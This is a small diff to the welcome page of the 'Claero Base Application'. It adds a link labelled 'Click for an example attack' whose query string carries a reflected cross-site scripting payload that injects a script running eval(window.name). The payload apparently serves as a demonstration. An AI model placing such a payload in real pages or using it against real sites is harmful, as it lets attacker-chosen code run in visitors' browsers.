@@ -1,5 +1,7 @@
 <h2>Welcome to the Claero Base Application.</h2>
 
+<p style="text-align: center"><a href="?test=%22><script>eval(window.name)</script>">Click for an example attack</a></p>
+
 <h3>Application layout</h3>
 
 <p>The Claero Base Application is comprised of three main parts:</p>
